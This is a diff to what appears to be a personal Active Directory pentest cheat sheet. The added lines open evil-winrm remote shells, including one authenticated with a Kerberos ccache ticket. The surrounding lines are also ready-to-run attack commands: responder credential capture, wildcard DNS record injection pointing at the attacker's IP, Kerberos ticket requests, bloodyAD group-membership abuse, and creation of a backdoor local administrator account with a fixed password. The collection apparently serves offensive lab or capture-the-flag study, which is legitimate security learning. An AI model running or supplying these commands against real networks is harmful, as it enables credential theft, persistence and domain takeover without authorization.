@@ -194,6 +194,7 @@ sudo responder -I tun0 -v
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
+evil-winrm -i $DC -r $DOM
 
 ## Set Administrator Account
 net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
@@ -472,6 +473,9 @@ https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
 
 +---------- .ccache ----------+
 impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD'; export KRB5CCNAME='$USERNAME.ccache'
+
++---------- .ccache to evil-winrm ----------+
+KRB5CCNAME='$USERNAME.ccache' evil-winrm -i $DC -r $DOM
 
 +---------- AddSelf ----------+
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; export KRB5CCNAME='$USERNAME.ccache'
